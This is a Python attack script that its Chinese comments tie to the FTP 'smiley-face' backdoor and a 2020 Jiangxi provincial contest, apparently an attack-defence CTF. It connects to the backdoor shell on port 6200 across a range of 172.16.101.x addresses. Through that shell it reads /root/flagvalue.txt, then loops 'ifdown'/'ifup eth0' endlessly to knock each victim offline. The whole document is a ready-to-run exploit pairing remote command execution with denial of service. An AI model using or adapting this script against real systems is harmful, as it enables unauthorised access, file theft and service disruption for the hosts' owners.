#针对ftp笑脸漏洞的
#2020江西省第二阶段的脚本
import socket
import threading

def payload(ip):
    try:
        max_socket=socket.socket()
        while True:
            try:
                max_socket.connect((ip,6200))
                break
            except:
                pass
        max_socket.send('cat /root/flagvalue.txt\n'.encode())
        a=max_socket.recv(1024).decode()
        print(ip,a)
        while True:
            max_socket.send('ifup eth0\n'.encode())
            max_socket.send('ifdown eth0\n'.encode())
    except:
        pass
if __name__=='__main__':
    for i in range(1,20):
        ip='172.16.101.'+str(i)
        max_thread=threading.Thread(target=payload,args=(ip,))
        max_thread.start()
